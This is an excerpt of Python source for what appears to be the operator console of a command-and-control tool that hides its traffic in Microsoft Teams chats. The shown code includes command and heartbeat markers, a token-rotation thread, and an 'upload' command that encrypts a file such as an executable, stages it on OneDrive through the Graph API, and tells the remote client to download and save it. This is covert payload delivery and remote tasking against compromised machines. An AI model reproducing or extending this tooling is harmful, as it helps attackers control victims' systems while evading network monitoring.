...
try:
    from teams_server import (
        ...
        decrypt_file,
        encrypt_file,
        upload_to_onedrive,   # replaces upload_to_onenote
        CMD_START, CMD_END,
        OUT_START, OUT_END,
        ERR_START, ERR_END,
        HB_START,  HB_END,
    ...
    def _connect(self, server_user: str, server_pass: str, contact: str,
        ...
        try:
            ...
            if client_tokens_for_rotation is not None:
                ...
                threading.Thread(
                    target=token_rotation_loop,
                    args=(self._server_tokens, self._thread_id, None, self._debug),daemon=True,name="TokenRotation_Server",
            ).start()
            _tui_log(
                f"[*] Server token rotation started (every {TOKEN_ROTATION_INTERVAL}s)", "info"
            )
...
#########################################################################################
    def _dispatch_command(self, raw_cmd: str) -> None:
        ...
        try:
            ...
            if verb == "upload":
                if len(parts) < 2:
                    _tui_log("Usage: upload <local_path> [<dest_path_on_client>]", "warn")
                    return
                arg_str   = parts[1]
                dest_path = ""

                # Parse: upload <local_path> [<dest_path>]
                # If the first token is an existing file, second token (if any) is dest_path.
                # If the first token is NOT an existing file but split gives two tokens,
                # first is local_path and second is remote_name (legacy behaviour).
                sub = arg_str.split(None, 1)
                if len(sub) == 2 and os.path.isfile(sub[0]):
                    # "upload C:\Temp\file.exe C:\dest\file.exe"
                    local_path  = sub[0]
                    dest_path   = sub[1].strip()
                    remote_name = os.path.basename(local_path)
                elif len(sub) == 2 and not os.path.isfile(arg_str):
                    # Legacy: "upload C:\Temp\file.exe remote_name"
                    local_path  = sub[0]
                    remote_name = sub[1].strip()
                else:
                    # Single argument: "upload C:\Temp\file.exe"
                    local_path  = arg_str
                    remote_name = os.path.basename(local_path)
                ...
                if not os.path.isfile(local_path):
                    ...
                    return
                self._do_upload(local_path, remote_name, dest_path)
                return
    ...
    def _do_upload(self, local_path: str, remote_name: str, dest_path: str = "") -> None:
        try:
            ...
            _tui_log(
                f"[*] Preparing '[bold]{remote_name}[/]' "
                f"({file_size_kb:.1f} KB){dest_info} via OneDrive Graph API...",
                "info"
            )

            # Upload encrypted file to OneDrive and get a direct download URL
            download_url = upload_to_onedrive(local_path, remote_name, self._server_tokens, self._debug)
            
            # Send downloadfrom command: client will GET the URL, decrypt, and save
            cmd_payload = f"downloadfrom {remote_name} {dest_path} {download_url}"
            cmd_msg = f"{CMD_START}{cmd_payload}{CMD_END}"
            
            send_raw(self._thread_id, cmd_msg, self._server_tokens, self._debug)
            _tui_log(f"[*] Sent direct download URL to Client. Waiting for ACK…", "success")

        except Exception as e:
            _tui_log(f"[-] OneDrive upload failed: {e}", "error")
